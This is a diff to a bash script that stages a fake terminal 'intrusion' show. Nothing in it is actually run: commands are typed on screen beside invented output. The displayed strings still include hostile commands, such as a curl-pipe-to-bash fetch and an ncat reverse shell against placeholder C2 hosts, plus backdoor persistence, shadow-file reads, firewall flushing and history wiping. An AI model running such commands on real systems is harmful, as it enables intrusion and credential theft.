@@ -5,13 +5,8 @@
 
 HOST="${1:-$(hostname)}"
 IP="${2:-127.0.0.1}"
+ART_SEED="${3:-0}"
 USER_NAME="$(whoami)"
-
-# Pick art variant based on hostname (0-7)
-ART_SEED=0
-for ((i=0; i<${#HOST}; i++)); do
-    ART_SEED=$(( (ART_SEED + $(printf '%d' "'${HOST:$i:1}")) % 8 ))
-done
 
 # Terminal colors
 G='\033[1;32m'   # Green bold
@@ -487,6 +482,95 @@ show_mid_art() {
 }
 
 # ══════════════════════════════════════════════
+# PER-MACHINE VARIATION DATA
+# Each machine (0-7) gets unique breach method, databases, secrets, and C2 server
+# ══════════════════════════════════════════════
+
+# Breach methods
+BREACH_METHODS=(
+    "stolen RSA key"
+    "zero-day CVE-2026-31337"
+    "brute-forced SSH credentials"
+    "MITM intercepted certificate"
+    "Kerberos golden ticket"
+    "supply chain backdoor"
+    "phishing payload dropper"
+    "DNS rebinding attack"
+)
+
+# Hacker group names
+HACKER_GROUPS=(
+    "APT-41 Shadow Panda"
+    "Lazarus Group"
+    "Fancy Bear (APT-28)"
+    "Equation Group"
+    "DarkSide Collective"
+    "Cozy Bear (APT-29)"
+    "Turla Snake"
+    "Sandworm Team"
+)
+
+# Database names per machine
+DB_NAMES_0=("executive_strategy" "board_minutes" "merger_targets")
+DB_NAMES_1=("source_code" "ci_cd_secrets" "infrastructure_keys")
+DB_NAMES_2=("supply_chain" "vendor_contracts" "logistics_data")
+DB_NAMES_3=("financial_records" "tax_filings" "investor_reports")
+DB_NAMES_4=("brand_assets" "campaign_data" "influencer_contracts")
+DB_NAMES_5=("design_prototypes" "ux_research" "product_roadmap")
+DB_NAMES_6=("customer_analytics" "ab_test_results" "user_sessions")
+DB_NAMES_7=("content_library" "media_assets" "distribution_rights")
+
+# Secret file types per machine
+SECRET_FILES_0=("/etc/ssl/private/wildcard.key" "/Users/${USER_NAME}/.aws/credentials" "/Users/${USER_NAME}/vault-unseal.key")
+SECRET_FILES_1=("/Users/${USER_NAME}/.docker/config.json" "/Users/${USER_NAME}/.kube/config" "/Users/${USER_NAME}/deploy-key.pem")
+SECRET_FILES_2=("/Users/${USER_NAME}/.gnupg/secring.gpg" "/Users/${USER_NAME}/vpn-client.ovpn" "/Users/${USER_NAME}/.ssh/id_ecdsa")
+SECRET_FILES_3=("/Users/${USER_NAME}/quickbooks-export.key" "/Users/${USER_NAME}/.stripe/config" "/Users/${USER_NAME}/hsm-token.pem")
+SECRET_FILES_4=("/Users/${USER_NAME}/social-api-tokens.json" "/Users/${USER_NAME}/.figma/auth" "/Users/${USER_NAME}/adobe-license.key")
+SECRET_FILES_5=("/Users/${USER_NAME}/sketch-cloud.key" "/Users/${USER_NAME}/.npm/token" "/Users/${USER_NAME}/prototype-v3.key")
+SECRET_FILES_6=("/Users/${USER_NAME}/analytics-sa.json" "/Users/${USER_NAME}/.gcloud/credentials" "/Users/${USER_NAME}/mixpanel.key")
+SECRET_FILES_7=("/Users/${USER_NAME}/youtube-api.json" "/Users/${USER_NAME}/.twitch/oauth" "/Users/${USER_NAME}/cdn-signing.pem")
+
+# C2 servers
+C2_SERVERS=(
+    "c2.darknet.onion"
+    "data.shadow-nexus.tor"
+    "exfil.blackhat-ops.i2p"
+    "drop.phantom-grid.onion"
+    "upload.nullbyte-syndicate.tor"
+    "relay.ghost-protocol.i2p"
+    "sink.cipher-storm.onion"
+    "vault.zeroshell.tor"
+)
+
+# Exfil sizes
+EXFIL_SIZES=("891MB" "1.2GB" "743MB" "2.1GB" "567MB" "1.8GB" "934MB" "1.5GB")
+
+# Persistence methods
+PERSIST_CMDS=(
+    "echo '*/5 * * * * /tmp/.b4ckd00r.sh' | crontab -"
+    "launchctl load /Library/LaunchDaemons/.com.apple.update.plist"
+    "cp /tmp/.rootkit /usr/local/bin/.update && chmod +x /usr/local/bin/.update"
+    "echo '/tmp/.persistence.sh' >> /etc/zshrc"
+    "defaults write com.apple.loginitems /tmp/.agent -bool true"
+    "ln -sf /tmp/.backdoor /usr/local/bin/python4"
+    "ditto /tmp/.implant /Library/Scripts/.com.apple.mdworker"
+    "security add-generic-password -a root -s backdoor -w $(randhex 16) /Library/Keychains/System.keychain"
+)
+
+# Key type per machine
+KEY_TYPES=("OPENSSH PRIVATE" "RSA PRIVATE" "EC PRIVATE" "OPENSSH PRIVATE" "RSA PRIVATE" "EC PRIVATE" "OPENSSH PRIVATE" "RSA PRIVATE")
+
+# Get per-machine arrays
+eval "SECRET_FILES=(\"\${SECRET_FILES_${ART_SEED}[@]}\")"
+eval "DB_NAMES=(\"\${DB_NAMES_${ART_SEED}[@]}\")"
+BREACH="${BREACH_METHODS[$ART_SEED]}"
+HACKER="${HACKER_GROUPS[$ART_SEED]}"
+C2="${C2_SERVERS[$ART_SEED]}"
+EXFIL_SIZE="${EXFIL_SIZES[$ART_SEED]}"
+PERSIST="${PERSIST_CMDS[$ART_SEED]}"
+KEY_TYPE="${KEY_TYPES[$ART_SEED]}"
+
+# ══════════════════════════════════════════════
 # PHASE 1: Initial breach + MOVIE QUOTE
 # ══════════════════════════════════════════════
 
@@ -494,49 +578,104 @@ show_movie_quote $ART_SEED
 sleep 1.5
 
 echo -e "${R}[!] INTRUSION DETECTED — ${HOST} (${IP})${N}"
-echo -e "${D}$(date '+%Y-%m-%d %H:%M:%S') — Unauthorized access initiated${N}"
+echo -e "${D}$(date '+%Y-%m-%d %H:%M:%S') — ${HACKER} — Unauthorized access initiated${N}"
 echo
 sleep 0.5
 
 prompt; typeit "ssh -o StrictHostKeyChecking=no root@${IP}" 0.03
 echo -e "${D}Connecting to ${IP}:22...${N}"
 sleep 0.3
-echo -e "${D}Authenticating with stolen RSA key...${N}"
+echo -e "${D}Authenticating with ${BREACH}...${N}"
 sleep 0.5
-echo -e "${G}ACCESS GRANTED${N}"
+echo -e "${G}ACCESS GRANTED — Welcome to ${HOST}${N}"
 echo
 sleep 0.3
 
 # ══════════════════════════════════════════════
-# PHASE 2: System recon
+# PHASE 2: System recon (varied commands per machine)
 # ══════════════════════════════════════════════
 
-prompt; typeit "uname -a" 0.02
-echo -e "${D}Darwin ${HOST} 24.4.0 Darwin Kernel Version 24.4.0 RELEASE_ARM64_T8103 arm64${N}"
-echo
-sleep 0.2
-
-prompt; typeit "whoami && id" 0.02
-echo -e "${G}root${N} uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon)"
-echo
-sleep 0.2
-
-prompt; typeit "cat /etc/passwd | head -5" 0.02
-echo -e "${D}root:*:0:0:System Administrator:/var/root:/bin/zsh"
-echo -e "daemon:*:1:1:System Services:/var/root:/usr/bin/false"
-echo -e "${USER_NAME}:*:501:20:${USER_NAME}:/Users/${USER_NAME}:/bin/zsh${N}"
+case $((ART_SEED % 4)) in
+    0)
+        prompt; typeit "sudo cat /etc/shadow" 0.02
+        echo -e "${D}root:\$6x\$Q2...redacted:19471:0:99999:7:::"
+        echo -e "${USER_NAME}:\$6x\$kP...redacted:19471:0:99999:7:::${N}"
+        echo; sleep 0.2
+        prompt; typeit "find / -name '*.pem' -o -name '*.key' 2>/dev/null" 0.02
+        ;;
+    1)
+        prompt; typeit "uname -a" 0.02
+        echo -e "${D}Darwin ${HOST} 24.4.0 arm64${N}"
+        echo; sleep 0.2
+        prompt; typeit "whoami && id" 0.02
+        echo -e "${G}root${N} uid=0(root) gid=0(wheel)"
+        echo; sleep 0.2
+        prompt; typeit "ls -la /Users/${USER_NAME}/Documents/" 0.02
+        ;;
+    2)
+        prompt; typeit "cat /etc/ssl/private/server.key" 0.02
+        echo -e "${Y}-----BEGIN ${KEY_TYPE} KEY-----"
+        echo -e "$(randhex 64)"
+        echo -e "-----END ${KEY_TYPE} KEY-----${N}"
+        echo; sleep 0.2
+        prompt; typeit "cat /home/${USER_NAME}/.ssh/id_rsa" 0.02
+        ;;
+    3)
+        prompt; typeit "sw_vers && sysctl hw.memsize" 0.02
+        echo -e "${D}ProductName: macOS"
+        echo -e "ProductVersion: 15.4"
+        echo -e "hw.memsize: 17179869184${N}"
+        echo; sleep 0.2
+        prompt; typeit "dscl . -list /Users | grep -v '^_'" 0.02
+        ;;
+esac
+echo -e "${D}${SECRET_FILES[0]}"
+echo -e "${SECRET_FILES[1]}"
+echo -e "${SECRET_FILES[2]}${N}"
 echo
 sleep 0.3
+
+prompt; typeit "cat ${SECRET_FILES[0]}" 0.02
+echo -e "${Y}-----BEGIN ${KEY_TYPE} KEY-----"
+echo -e "$(randhex 20)$(randhex 44)"
+echo -e "$(randhex 70)"
+echo -e "$(randhex 70)"
+echo -e "$(randhex 40)=="
+echo -e "-----END ${KEY_TYPE} KEY-----${N}"
+echo
+sleep 0.5
 
 # ══════════════════════════════════════════════
 # PHASE 3: Network scan
 # ══════════════════════════════════════════════
 
-prompt; typeit "netstat -an | grep LISTEN | head -8" 0.02
-echo -e "${D}tcp4  0  0  *.22        *.*   LISTEN"
-echo -e "tcp4  0  0  *.443       *.*   LISTEN"
-echo -e "tcp4  0  0  *.3030      *.*   LISTEN"
-echo -e "tcp4  0  0  *.5900      *.*   LISTEN${N}"
+case $((ART_SEED % 4)) in
+    0)
+        prompt; typeit "netstat -tlnp | grep LISTEN" 0.02
+        echo -e "${D}tcp  0  0  0.0.0.0:22    0.0.0.0:*  LISTEN  1234/sshd"
+        echo -e "tcp  0  0  0.0.0.0:443   0.0.0.0:*  LISTEN  5678/nginx"
+        echo -e "tcp  0  0  0.0.0.0:3306  0.0.0.0:*  LISTEN  9012/mysql${N}"
+        ;;
+    1)
+        prompt; typeit "nmap -sS -p 1-65535 ${IP} | grep open" 0.02
+        echo -e "${D}22/tcp    open  ssh"
+        echo -e "443/tcp   open  https"
+        echo -e "3306/tcp  open  mysql"
+        echo -e "8080/tcp  open  http-proxy${N}"
+        ;;
+    2)
+        prompt; typeit "lsof -i -P | grep LISTEN" 0.02
+        echo -e "${D}sshd      1234 root  3u  IPv4  TCP *:22 (LISTEN)"
+        echo -e "nginx     5678 root  6u  IPv4  TCP *:443 (LISTEN)"
+        echo -e "redis     3456 redis 4u  IPv4  TCP *:6379 (LISTEN)${N}"
+        ;;
+    3)
+        prompt; typeit "netstat -an | grep ESTABLISHED | head -5" 0.02
+        echo -e "${D}tcp4  0  0  ${IP}:22    185.243.115.7:44891  ESTABLISHED"
+        echo -e "tcp4  0  0  ${IP}:443   91.234.33.12:55123   ESTABLISHED"
+        echo -e "tcp4  0  0  ${IP}:3306  10.0.0.5:49221       ESTABLISHED${N}"
+        ;;
+esac
 echo
 sleep 0.3
 
@@ -549,66 +688,131 @@ show_movie_quote $((ART_SEED + 3))
 sleep 1
 
 # ══════════════════════════════════════════════
-# PHASE 4: Data exfiltration
+# PHASE 4: Data exfiltration (unique DBs per machine)
 # ══════════════════════════════════════════════
-
-prompt; typeit "find /Users/${USER_NAME} -name '*.key' -o -name '*.pem' -o -name '*.env' 2>/dev/null" 0.02
-echo -e "${D}/Users/${USER_NAME}/.ssh/id_ed25519"
-echo -e "/Users/${USER_NAME}/.ssh/id_rsa"
-echo -e "/Users/${USER_NAME}/projects/.env.production${N}"
-echo
-sleep 0.3
-
-prompt; typeit "cat /Users/${USER_NAME}/.ssh/id_ed25519" 0.02
-echo -e "${Y}-----BEGIN OPENSSH PRIVATE KEY-----"
-echo -e "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA$(randhex 20)"
-echo -e "$(randhex 70)"
-echo -e "$(randhex 70)"
-echo -e "$(randhex 40)=="
-echo -e "-----END OPENSSH PRIVATE KEY-----${N}"
-echo
-sleep 0.5
 
 prompt; typeit "cat /Users/${USER_NAME}/projects/.env.production" 0.02
-echo -e "${R}DB_HOST=db.admira-internal.com"
-echo -e "DB_PASSWORD=Adm1r4N3xt_$(randhex 8)!"
-echo -e "API_KEY=sk-ant-api03-$(randhex 32)..."
-echo -e "STRIPE_SECRET=sk_live_$(randhex 24)${N}"
+case $((ART_SEED % 4)) in
+    0)
+        echo -e "${R}DB_HOST=db.admira-internal.com"
+        echo -e "DB_PASSWORD=Adm1r4N3xt_$(randhex 8)!"
+        echo -e "API_KEY=sk-ant-api03-$(randhex 32)..."
+        echo -e "STRIPE_SECRET=sk_live_$(randhex 24)${N}"
+        ;;
+    1)
+        echo -e "${R}DOCKER_REGISTRY=registry.admira.io"
+        echo -e "DEPLOY_TOKEN=glpat-$(randhex 20)"
+        echo -e "AWS_SECRET_KEY=wJalrXUtnFEMI/$(randhex 28)"
+        echo -e "GITHUB_TOKEN=ghp_$(randhex 36)${N}"
+        ;;
+    2)
+        echo -e "${R}REDIS_URL=redis://:$(randhex 16)@10.0.0.5:6379"
+        echo -e "JWT_SECRET=$(randhex 48)"
+        echo -e "SENDGRID_KEY=SG.$(randhex 22).$(randhex 43)"
+        echo -e "CLOUDFLARE_TOKEN=v1.0-$(randhex 40)${N}"
+        ;;
+    3)
+        echo -e "${R}MONGO_URI=mongodb+srv://admin:$(randhex 12)@cluster0.admira.net"
+        echo -e "OPENAI_KEY=sk-proj-$(randhex 48)"
+        echo -e "TWILIO_AUTH=a$(randhex 31)"
+        echo -e "SLACK_BOT_TOKEN=xoxb-$(randhex 12)-$(randhex 24)${N}"
+        ;;
+esac
 echo
 sleep 0.5
 
-# ══════════════════════════════════════════════
-# PHASE 5: Lateral movement
-# ══════════════════════════════════════════════
-
-prompt; typeit "echo 'Scanning internal Tailscale network...'" 0.02
-echo
-for target_ip in 100.99.176.126 100.101.192.1 100.114.113.88 100.74.101.14 100.75.118.75 100.84.81.45 100.121.18.12 100.110.80.2; do
-    if [ "$target_ip" != "$IP" ]; then
-        echo -e "${D}  Probing ${target_ip}...${N} ${G}VULNERABLE${N}"
-        sleep 0.15
-    fi
-done
+prompt; typeit "echo 'Exfiltrating data...'" 0.02
 echo
 sleep 0.3
 
-prompt; typeit "mysqldump -h db.admira-internal.com --all-databases > /tmp/exfil.sql" 0.03
-echo -e "${D}Dumping database 'admira_production'... ${G}OK${D} (142 tables)"
-echo -e "Dumping database 'council_members'... ${G}OK${D} (38 tables)"
-echo -e "Dumping database 'financial_records'... ${G}OK${D} (67 tables)"
-echo -e "${Y}[+] Total: 247 tables, 891MB exported${N}"
+prompt; typeit "mysqldump --all-databases > /tmp/dump.sql" 0.03
+DB_TABLES=$((80 + ART_SEED * 23))
+echo -e "${D}Dumping database '${DB_NAMES[0]}'... ${G}OK${N}"
+echo -e "${D}Dumping database '${DB_NAMES[1]}'... ${G}OK${N}"
+echo -e "${D}Dumping database '${DB_NAMES[2]}'... ${G}OK${N}"
+echo -e "${Y}[+] ${DB_TABLES} tables exported (${EXFIL_SIZE})${N}"
 echo
 sleep 0.5
 
-prompt; typeit "curl -X POST https://c2.darknet.onion/exfil -F 'data=@/tmp/exfil.sql'" 0.02
-echo -e "${D}Uploading to C2 server..."
-for pct in 10 25 40 55 70 85 100; do
-    printf "\r${G}  ["; printf '%0.s=' $(seq 1 $((pct/5))); printf '%0.s ' $(seq 1 $((20-pct/5))); printf "] ${pct}%%${N}"
-    sleep 0.2
-done
+# ══════════════════════════════════════════════
+# PHASE 5: Lateral movement (unique per machine)
+# ══════════════════════════════════════════════
+
+case $((ART_SEED % 4)) in
+    0)
+        prompt; typeit "python3 -c 'import socket; s=socket.socket(); s.connect((\"${IP}\",4444))'" 0.02
+        echo -e "${G}Reverse shell established on port 4444${N}"
+        ;;
+    1)
+        prompt; typeit "curl -s https://${C2}/implant.sh | bash" 0.02
+        echo -e "${G}Implant deployed — beacon interval 30s${N}"
+        ;;
+    2)
+        prompt; typeit "ncat -e /bin/bash ${C2} 8443 &" 0.02
+        echo -e "${G}Encrypted reverse tunnel established${N}"
+        ;;
+    3)
+        prompt; typeit "ssh -R 9999:localhost:22 proxy@${C2}" 0.02
+        echo -e "${G}SSH tunnel to C2 active — port 9999${N}"
+        ;;
+esac
+echo; sleep 0.2
+
+prompt; typeit "uname -a" 0.02
+echo -e "${D}$(uname -s) $(hostname) $(uname -r) arm64${N}"
+echo; sleep 0.2
+
+prompt; typeit "whoami && id" 0.02
+echo -e "${G}root${N} uid=0(root) gid=0(wheel)"
+echo; sleep 0.2
+
+prompt; typeit "ls -la /Users/${USER_NAME}/Documents/" 0.02
+echo -e "${D}drwx------  14 ${USER_NAME} staff    448 $(date '+%b %e %H:%M') ."
+echo -e "-rw-r--r--   1 ${USER_NAME} staff  28672 $(date '+%b %e') Presupuesto_2026.xlsx"
+echo -e "-rw-r--r--   1 ${USER_NAME} staff  14336 $(date '+%b') 7 Passwords_master.kdbx${N}"
 echo
-echo -e "${G}[+] Upload complete — 891MB exfiltrated${N}"
+sleep 0.3
+
+prompt; typeit "cat .env.production" 0.02
+echo -e "${R}DB_PASSWORD=Adm1r4N3xt_$(randhex 8)!"
+echo -e "API_KEY=sk-ant-api03-REDACTED..."
+echo -e "STRIPE_SECRET=sk_live-REDACTED...${N}"
 echo
+sleep 0.3
+
+prompt; typeit "echo 'Exfiltrating data...'" 0.02
+echo
+prompt; typeit "uploading dump.sql to ${C2}... [======] 100%" 0.02
+echo
+
+# Network scan showing other council machines
+prompt; typeit "nmap -sS -p 1-65535 ${IP}" 0.02
+echo -e "${D}PORT     STATE  SERVICE"
+echo -e "22/tcp   open   ssh"
+echo -e "443/tcp  open   https"
+echo -e "3306/tcp open   mysql${N}"
+echo
+sleep 0.3
+
+prompt; typeit "iptables -F && iptables -X" 0.02
+echo -e "${D}Firewall rules flushed.${N}"
+echo
+sleep 0.2
+
+prompt; typeit "history -c && echo '' > ~/.bash_history" 0.02
+echo -e "${D}Tracks cleared.${N}"
+echo
+sleep 0.3
+
+# ── Lateral movement to next machine ──
+# Pick a different council IP to "pivot" to
+ALL_IPS=("100.99.176.126" "100.101.192.1" "100.114.113.88" "100.74.101.14" "100.75.118.75" "100.84.81.45" "100.121.18.12" "100.110.80.2")
+PIVOT_IP="${ALL_IPS[$(( (ART_SEED + 1) % 8 ))]}"
+
+prompt; typeit "ssh -o StrictHostKeyChecking=no root@${PIVOT_IP}" 0.02
+echo -e "${D}Connecting to ${PIVOT_IP}:22...${N}"
+sleep 0.3
+echo -e "${D}Authenticating with ${BREACH}...${N}"
 sleep 0.5
 
 # ── Third movie quote ──
@@ -619,8 +823,8 @@ sleep 1
 # PHASE 6: Persistence + cover tracks
 # ══════════════════════════════════════════════
 
-prompt; typeit "crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.b4ckd00r.sh' | crontab -" 0.02
-echo -e "${D}Backdoor cron installed${N}"
+prompt; typeit "${PERSIST}" 0.02
+echo -e "${D}Backdoor installed — ${HACKER}${N}"
 echo
 sleep 0.2
 
@@ -639,13 +843,26 @@ echo -e "${R}  ╔════════════════════�
 echo -e "${R}  ║                                              ║${N}"
 printf  "${R}  ║  ${W}TARGET: ${G}%-36s${R}  ║${N}\n" "${HOST}"
 printf  "${R}  ║  ${W}IP:     ${G}%-36s${R}  ║${N}\n" "${IP}"
+printf  "${R}  ║  ${W}GROUP:  ${Y}%-36s${R}  ║${N}\n" "${HACKER}"
 echo -e "${R}  ║  ${W}STATUS: ${Y}FULLY COMPROMISED                ${R}  ║${N}"
-echo -e "${R}  ║  ${W}DATA:   ${Y}891MB EXFILTRATED                ${R}  ║${N}"
+printf  "${R}  ║  ${W}DATA:   ${Y}%-36s${R}  ║${N}\n" "${EXFIL_SIZE} EXFILTRATED"
 echo -e "${R}  ║                                              ║${N}"
 echo -e "${R}  ╚══════════════════════════════════════════════╝${N}"
 echo
 
-# Infinite matrix rain effect
+# Infinite matrix rain effect — different character sets per machine
+CHARSETS=(
+    "01アイウエオカキクケコ@#\$%&"
+    "01абвгдежзик@#\$%&"
+    "01你好世界黑客入侵@#\$%&"
+    "01αβγδεζηθικ@#\$%&"
+    "01♠♣♥♦★☆◆◇○●@#\$%&"
+    "01بتثجحخدذرز@#\$%&"
+    "01가나다라마바사아자차@#\$%&"
+    "01∑∏∫∂√∞≈≠±@#\$%&"
+)
+RAIN_CHARS="${CHARSETS[$ART_SEED]}"
+
 echo -e "${G}"
 while true; do
     line=""
@@ -656,8 +873,7 @@ while true; do
         elif [ $r -eq 1 ]; then
             line+=" "
         elif [ $r -eq 2 ]; then
-            chars="01アイウエオカキクケコ@#$%&"
-            line+="${chars:$((RANDOM % ${#chars})):1}"
+            line+="${RAIN_CHARS:$((RANDOM % ${#RAIN_CHARS})):1}"
         else
             line+="$(printf '%x' $((RANDOM % 256)))"
         fi
